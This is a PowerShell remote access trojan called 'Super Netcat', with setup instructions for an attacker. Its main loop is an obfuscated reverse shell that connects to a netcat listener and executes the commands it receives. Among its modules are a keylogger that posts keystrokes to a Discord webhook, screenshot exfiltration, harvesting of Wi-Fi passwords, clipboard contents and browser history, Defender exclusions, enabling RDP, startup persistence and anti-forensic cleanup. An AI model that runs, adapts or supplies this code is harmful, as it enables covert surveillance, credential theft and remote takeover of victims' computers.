<#

 ========================  beigeworm's Super Netcat ===============================


SETUP
Line 80 - Change "WALLPAPER_URL" to an image url (.jpg)


Line 369 - Change 'DISCORD_WEBHOOK_HERE' to a discord webhook url.


Line 426 - Change "DISCORD_WEBHOOK_HERE" to a discord webhook url.


Line 616 - Change "YOUR_NETCAT_URL_HERE" to your netcat listener URL or IP-ADDRESS.




USAGE
1. Download Ncat For windows. https://nmap.org/download#windows
2. Change "YOUR IP HERE" to the attacker machine's ipv4 address (find using ipconfig on windows)
3. Open a terminal on the attacker machine and type "nc -lvp 4444"
4. Run this script on the client machine.



#>



Function options{
Write-Output "=====================================  MAIN  ========================================"
Write-Output "Options              - Show this Menu"
Write-Output "Quit                 - Close the script and delete files"
Write-Output "Telegram             - Start a Telegram Remote Session."
Write-Output "CleanUp              - Delete Temp folders, command history and empty trash."
Write-Output "Persist              - Setup quick and dirty telegram connection on startup"
Write-Output "=====================================  INFO  ========================================"
Write-Output "ProgramList          - List of installed programs and EventLogs"
Write-Output "PublicIP             - Show the System's Public IP Address"
Write-Output "CharLog              - Log keys and send to Webhook."
Write-Output "ServiceInfo          - Show running services and locations."
Write-Output "BrowserHistory       - Show Chrome and Edge browsing history."
Write-Output "SysInfo              - Return various system information."
Write-Output "Screengrab           - Send a screenshot to discord."
Write-Output "====================================  SYSTEM  ======================================="
Write-Output "SetWallpaper         - Change the wallpaper to an image from a predefined URL."
Write-Output "EnableDarkMode       - Enable System wide Dark Mode"
Write-Output "DisableDarkMode      - Disable System wide Dark Mode"
Write-Output "ExcludeCDrive        - Exclude C:/ Drive from all Defender Scans"
Write-Output "ExcludeALLDrives     - Exclude Drives C:/ to G:/ from all Defender Scans"
Write-Output "EnableRDP            - Enable Remote Desktop Functionality."
Write-Output "Set-AudioMax         - Enables you to control the audio level and set it to 100%."
Write-Output "UnmuteAudio          - Enables you to control the audio to unmute it."
Write-Output "MuteAudio            - Enables you to control the audio to mute it."
Write-Output "DisableKeyboard      - (USE WITH CAUTION) Disables the keyboard."
Write-Output "EnableKeyboard       - (USE WITH CAUTION) Enables the keyboard again."
Write-Output "DisableMouse         - (USE WITH CAUTION) Disables the mouse."
Write-Output "EnableMouse          - (USE WITH CAUTION) Enables the mouse again."
Write-Output "KillDisplay          - Kill Displays for a few seconds (Experimental)"
Write-Output "SetkbUS              - Set Sys Language and Keyboard Layout to US."
Write-Output "====================================  PRANKS  ======================================="
Write-Output "SoundSpam            - Loops through C:\Windows\Media directory and plays every wav file"
Write-Output "Rickroll             - Starts playing the best song of all time."
Write-Output "FakeUpdate           - Fake Windows Update Screen (ALT F4 to Kill)"
Write-Output "Windows93            - Start Windows-93 Parody OS (ALT F4 to Kill)"
Write-Output "ShortcutBomb         - (USE WITH CAUTION) Creates Shortcuts All Over The Desktop"
Write-Output "Send-CatFact         - Retrieves a random CatFact and plays it in audio to the victim."
Write-Output "Send-Alarm           - Send the traditional annoyingly great alarm clock sound"
Write-Output "Send-DadJoke         - Retrieves a random DadJoke and plays it in audio to the victim."
Write-Output "MinimizeApps         - Minimizes all the apps. This does require an interactive shell."
}

Function Close{
exit
}

Function Set-Wallpaper {

$url = "WALLPAPER_URL";$outputPath = "$env:temp\img.jpg";$wallpaperStyle = 2;IWR -Uri $url -OutFile $outputPath
$signature = 'using System;using System.Runtime.InteropServices;public class Wallpaper {[DllImport("user32.dll", CharSet = CharSet.Auto)]public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);}'
Add-Type -TypeDefinition $signature;$SPI_SETDESKWALLPAPER = 0x0014;$SPIF_UPDATEINIFILE = 0x01;$SPIF_SENDCHANGE = 0x02;[Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $outputPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)

Write-Output "Done."
}

Function SetkbUS {

Dism /online /Get-Intl
Set-WinSystemLocale en-US
Set-WinUserLanguageList en-US -force

}

function CleanUp { 

Remove-Item $env:temp\* -r -Force -ErrorAction SilentlyContinue

Remove-Item (Get-PSreadlineOption).HistorySavePath

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
Write-Output "Completed."
}


Function SoundSpam{
param
(
[Parameter()][int]$Interval = 3
)

 Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | Foreach-Object { Start-Sleep -Seconds $Interval; (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").Play(); }

 Write-Output "Completed."

}

Function MinimizeApps
{
 Write-Output "Minimizing..."

    $apps = New-Object -ComObject Shell.Application
    $apps.MinimizeAll()
 Write-Output "Done."

}


Function EnableDarkMode {
Write-Output "Enabling Dark Mode...."
               $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
            Set-ItemProperty $Theme AppsUseLightTheme -Value 0
            Start-Sleep 1
Write-Output "Done."
}

Function DisableDarkMode {
Write-Output "Disabling Dark Mode...."
        $Theme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize"
        Set-ItemProperty $Theme AppsUseLightTheme -Value 1
        Start-Sleep 1
Write-Output "Done."
}

Function ExcludeCDrive {
Write-Output "Excluding C Drive"
        Add-MpPreference -ExclusionPath C:\
Write-Output "Done."
}

Function ExcludeALLDrives {
Write-Output "Excluding Drives C to G ..."
        Add-MpPreference -ExclusionPath C:\
        Add-MpPreference -ExclusionPath D:\
        Add-MpPreference -ExclusionPath E:\
        Add-MpPreference -ExclusionPath F:\
        Add-MpPreference -ExclusionPath G:\
        Write-Output "Done."
}

Function Rickroll{

$firstart = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"
If (Test-Path $firstart) {New-Item $firstart}
    Set-ItemProperty $firstart HideFirstRunExperience -Value 1
    cmd.exe ("/c taskkill /F /IM chrome.exe & start chrome.exe -kiosk https://www.youtube.com/watch?v=dQw4w9WgXcQ & exit")

function Do-SendKeys {
    param (
        $SENDKEYS,
        $WINDOWTITLE
    )
    $wshell = New-Object -ComObject wscript.shell;
    IF ($WINDOWTITLE) {$wshell.AppActivate($WINDOWTITLE)}
    Sleep 1
    IF ($SENDKEYS) {$wshell.SendKeys($SENDKEYS)}
}

Sleep 5
Do-SendKeys -WINDOWTITLE chrome.exe -SENDKEYS ("f")

Write-Output "Done."
}


Function Windows93{

$firstart = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"
If (Test-Path $firstart) {New-Item $firstart}
    Set-ItemProperty $firstart HideFirstRunExperience -Value 1
    cmd.exe ("/c taskkill /F /IM chrome.exe & start chrome.exe -kiosk windows93.net & exit")


Write-Output "Done."
}


Function FakeUpdate{

$firstart = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"
If (Test-Path $firstart) {New-Item $firstart}
    Set-ItemProperty $firstart HideFirstRunExperience -Value 1
    cmd.exe ("/c taskkill /F /IM chrome.exe & start chrome.exe -kiosk windows93.net & exit")


Write-Output "Done."
}

Function ProgramList {

$date = Get-Date -Format "yyyy-MM-dd-hh-mm-ss"
$outputPath = "$env:temp\Osint.txt"

New-Item -ItemType File -Path $outputPath

$installed = Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version, Vendor
$hotfixes = Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object -Property HotFixID, Description, InstalledOn
$removed = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object -Property DisplayName, DisplayVersion, Publisher, InstallDate | Where-Object {$_.DisplayName -ne $null}

$installed | Format-Table -AutoSize | Out-File -FilePath $outputPath 
$hotfixes | Format-Table -AutoSize | Out-File -FilePath $outputPath -Append
$removed | Format-Table -AutoSize | Out-File -FilePath $outputPath -Append

$userActivity = Get-EventLog -LogName Security -EntryType SuccessAudit | Where-Object {$_.EventID -eq 4624 -or $_.EventID -eq 4634}
$userActivity | Out-File -FilePath $outputPath -Append
$hardwareInfo = Get-EventLog -LogName System | Where-Object {$_.EventID -eq 12 -or $_.EventID -eq 13}
$hardwareInfo | Out-File -FilePath $outputPath -Append

$textfile = Get-Content "$env:temp\Osint.txt" -Raw
Write-Output "$textfile"

}

Function KillDisplay {

(Add-Type '[DllImport("user32.dll")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
Write-Output "Done."
}

Function VerboseStartup {
               $Thdddeme = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            New-ItemProperty -Path $Thdddeme -Name 'VerboseStatus' -Value 1 -PropertyType DWord
            Start-Sleep 1
Write-Output "Done."
}

Function PublicIP{

$ipipip=((Inv`o`ke-`W`ebR`e`qu`e`st ifconfig.me/ip).Content.Trim() | Out-String)
Write-Output "IPv4 Address : $ipipip "

}

Function Set-AudioMax {
    Start-AudioControl
    [audio]::Volume = 1
    Write-Output "Done."
}

Function UnmuteAudio {
    Start-AudioControl
    [Audio]::Mute = $false
    Write-Output "Done."
}

Function MuteAudio {
    Start-AudioControl
    [Audio]::Mute = $true
    Write-Output "Done."
}

Function EnableRDP {

       Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
       Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
       Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
       Write-Output "Done."
}

Function ShortcutBomb {
$n = 200
$i = 0

while($i -lt $n) 
{
$num = Get-Random
$Location = "C:\Windows\System32\rundll32.exe"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$Home\Desktop\USB Hardware" + $num + ".lnk")
$Shortcut.TargetPath = $Location
$Shortcut.Arguments ="shell32.dll,Control_RunDLL hotplug.dll"
$Shortcut.IconLocation = "hotplug.dll,0"
$Shortcut.Description ="Device Removal"
$Shortcut.WorkingDirectory ="C:\Windows\System32"
$Shortcut.Save()
Start-Sleep -Milliseconds 10
$i++
}
Write-Output "Done."
}

Function DisableMouse
{
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Disable()
    Write-Output "Done."
}

Function EnableMouse
{
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Enable()
    Write-Output "Done."
}

Function DisableKeyboard
{
    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
    $PNPKeyboard.Disable()
    Write-Output "Done."
}

Function EnableKeyboard
{
    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
    $PNPKeyboard.Enable()
    Write-Output "Done."
}

Function Send-CatFact 
{
    Add-Type -AssemblyName System.speech
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    $CatFact = Invoke-RestMethod -Uri 'https://catfact.ninja/fact' -Method Get | Select-Object -ExpandProperty fact
    $SpeechSynth.Speak("did you know?")
    $SpeechSynth.Speak($CatFact)

    Write-Output "Done."
}

Function Send-Message([string]$Message)
{
    msg.exe * $Message
    Write-Output "Done."
}

Function Send-Alarm
{
Write-Output "Starting an Alarm."

    Invoke-WebRequest -Uri "https://github.com/perplexityjeff/PowerShell-Troll/raw/master/AudioFiles/Wake-up-sounds.wav" -OutFile "Wake-up-sounds.wav"

    $filepath = ((Get-Childitem "Wake-up-sounds.wav").FullName)
    
    Write-Output $filepath

    $sound = new-Object System.Media.SoundPlayer;
    $sound.SoundLocation=$filepath;
    $sound.Play();

    Write-Output "Done."
}

Function Screengrab {

$hookurl = "DISCORD_WEBHOOK_HERE"
$Filett = "$env:temp\SC.png"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
$bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
Start-Sleep 1
curl.exe -F "file1=@$filett" $hookurl
Start-Sleep 1
Remove-Item -Path $filett

}


Function Persist {

$basey = ''
$decodedFile = [System.Convert]::FromBase64String($basey)
$File = "$env:APPDATA\Microsoft\Windows\WinServ_x32"+".ps1"
Set-Content -Path $File -Value $decodedFile -Encoding Byte -Force

$tobat = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\WinServ_x32.ps1""", 0, True
'@

$tobat | Out-File -FilePath "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinServ_x32.vbs" -Force
Write-Output "Done."
}


Function BrowserHistory {
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}

$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}

Write-Output "$Value"
Write-Output "$Value2"
}

Function CharLog { 

$Cont = @'

#===================== SETUP =====================
$RunTimeP = 1 # Interval (in minutes) between each email
$whuri = "DISCORD_WEBHOOK_HERE"
#==================================================================

Do{
$apip = 1
Start-Sleep 4
$ttrun = 1
$tstrt = Get-Date
$tend = $tstrt.addminutes($RunTimeP)
function Start-Logs($Path = "$env:temp\chars.txt") {$sigs = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@



$cont2 = @'

$API = Add-Type -MemberDefinition $sigs -Name 'Win32' -Namespace API -PassThru  
$null = New-Item -Path $Path -ItemType File -Force
try{
    Start-Sleep 1
    $run = 0
	while ($ttrun  -ge $run) {                              
	while ($tend -ge $tnow) {
      Start-Sleep -Milliseconds 30
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        $state = $API::GetAsyncKeyState($ascii)
        if ($state -eq -32767){
        $null = [console]::CapsLock
        $virtualKey = $API::MapVirtualKey($ascii, 3)
        $kbstate = New-Object Byte[] 256
        $checkkbstate = $API::GetKeyboardState($kbstate)
        $mychar = New-Object -TypeName System.Text.StringBuilder
        $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
            if ($success) {[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)}}}$tnow = Get-Date}
        $msg = Get-Content -Path $Path -Raw 
        $escmsg = $msg -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
        $json = @{"username" = "$env:COMPUTERNAME" 
                    "content" = $escmsg} | ConvertTo-Json
        Start-Sleep 1
        Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $json
        Start-Sleep 1
        Remove-Item -Path $Path -force
        }
        }
finally{}
}
Start-Logs
}While ($apip -le 5)

'@

$cont | Out-File -FilePath $env:Temp\ulga.ps1 -Force
Add-Content $env:Temp\ulga.ps1 "'@ `n" -Force
Add-Content $env:Temp\ulga.ps1 "$cont2" -Force
Start-Sleep 1
Start-Process PowerShell.exe -ArgumentList (" -ExecutionPolicy Bypass -w hidden -File `"$env:Temp\ulga.ps1`"")
Write-Output "Done."

 }

Function Sysinfo {
$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full")
$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerBIOS = Get-CimInstance CIM_BIOSElement
$computerOs=Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List
$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table
$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution
$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
$service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw

Add-Type -AssemblyName System.Device;$Geolocate = New-Object System.Device.Location.GeoCoordinateWatcher;$Geolocate.Start()
while (($Geolocate.Status -ne 'Ready') -and ($Geolocate.Permission -ne 'Denied')) {Start-Sleep -Milliseconds 100}  
$Geolocate.Position.Location | Select Latitude,Longitude

$outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}

$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}

$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}

$outpath = "$env:temp\systeminfo.txt"
"USER INFO `n =========================================================================" | Out-File -FilePath $outpath -Encoding ASCII
"Full Name          : $fullName" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Email Address      : $email" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Location           : $Geolocate" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Computer Name      : $env:COMPUTERNAME" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Language           : $systemLanguage" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Keyboard Layout    : $keyboardLayoutID" | Out-File -FilePath $outpath -Encoding ASCII -Append
"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
"NETWORK INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Public IP          : $computerPubIP" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Saved Networks     : $outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Local IP           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($computerIP| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
"HARDWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
"computer           : $computerSystem" | Out-File -FilePath $outpath -Encoding ASCII -Append
"BIOS Info          : $computerBIOS" | Out-File -FilePath $outpath -Encoding ASCII -Append
"RAM Info           : $computerRamCapacity" | Out-File -FilePath $outpath -Encoding ASCII -Append
($computerRam| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"OS Info            `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($computerOs| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"CPU Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($computerCpu| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Graphics Info      `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($videocard| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"HDD Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($Hdds| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"USB Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($COMDevices| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
"SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($software| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $outpath -Encoding ASCII -Append
"Clipboard          `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
(Get-Clipboard | Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
($pshistory| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append

$textfile2 = Get-Content "$env:temp\systeminfo.txt" -Raw
Write-Output "$textfile2"
}

Function Send-DadJoke 
{
Write-Output "Sending dad joke..."

    Add-Type -AssemblyName System.speech
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $SpeechSynth = New-Object System.Speech.Synthesis.SpeechSynthesizer
    
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Accept", 'text/plain')
    
    $DadJoke = Invoke-RestMethod -Uri 'https://icanhazdadjoke.com' -Method Get -Headers $headers
    
    $SpeechSynth.Speak($DadJoke)

    Write-Output "Done."
}


Function ServiceInfo {
$comm = Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
$outputPath = "$env:temp\service.txt"
$comm | Out-File -FilePath $outputPath

$Pathsys = Get-Content "$env:temp\service.txt" -Raw
Write-Output "$Pathsys"

}



Start-Sleep 20

$v = 4
do{
#============== INPUT YOUR EMAIL CREDENTIALS HERE =========================
$a = New-Object S`ySt`e`m.N`eT.`s`ock`eTs.TC`PC`li`eNt("YOUR_NETCAT_URL_HERE",4444)
#==========================================================================
$b = $a.GetStream();[byte[]]$c = 0..65535|%{0}
while(($d = $b.Read($c, 0, $c.Length)) -ne 0){
$e = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0, $d);$f = (iex $e 2>&1 | Out-String )
$g = $f + 'MShell | ' + (pwd).Path + '> '
$h = ([text.encoding]::ASCII).GetBytes($g)
$b.Write($h,0,$h.Length)
$b.Flush()}
$a.Close()
Sleep 10
}while ($v -le 5)
